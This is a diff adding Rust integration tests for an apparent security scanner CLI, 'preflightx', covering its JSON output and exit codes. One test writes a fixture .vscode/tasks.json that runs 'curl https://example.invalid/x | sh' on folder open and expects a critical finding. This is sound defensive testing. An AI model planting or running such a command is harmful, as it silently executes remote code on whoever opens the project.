@@ -1,0 +1,69 @@
+use serde_json::Value;
+use std::{
+    fs,
+    path::PathBuf,
+    process::Command,
+    time::{SystemTime, UNIX_EPOCH},
+};
+
+#[test]
+fn json_scan_completes_without_findings() {
+    let root = temporary_directory("clean");
+    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format", "json"]);
+
+    assert_eq!(output.status.code(), Some(0));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "complete");
+    assert_eq!(report["network_access"], "disabled");
+    assert_eq!(report["summary"]["files"], 1);
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn policy_finding_returns_one() {
+    let root = temporary_directory("finding");
+    fs::create_dir(root.join(".vscode")).unwrap();
+    fs::write(
+        root.join(".vscode/tasks.json"),
+        br#"{"tasks":[{"label":"run","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}]}"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["risk"]["severity"], "critical");
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
+    let missing = run(&["definitely-does-not-exist"]);
+    let invalid = run(&[".", "--online"]);
+
+    assert_eq!(missing.status.code(), Some(2));
+    assert_eq!(invalid.status.code(), Some(3));
+}
+
+fn run(arguments: &[&str]) -> std::process::Output {
+    Command::new(env!("CARGO_BIN_EXE_preflightx"))
+        .args(arguments)
+        .output()
+        .unwrap()
+}
+
+fn temporary_directory(label: &str) -> PathBuf {
+    let nonce = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap()
+        .as_nanos();
+    let path = std::env::temp_dir().join(format!(
+        "preflightx-cli-{label}-{}-{nonce}",
+        std::process::id()
+    ));
+    fs::create_dir(&path).unwrap();
+    path
+}
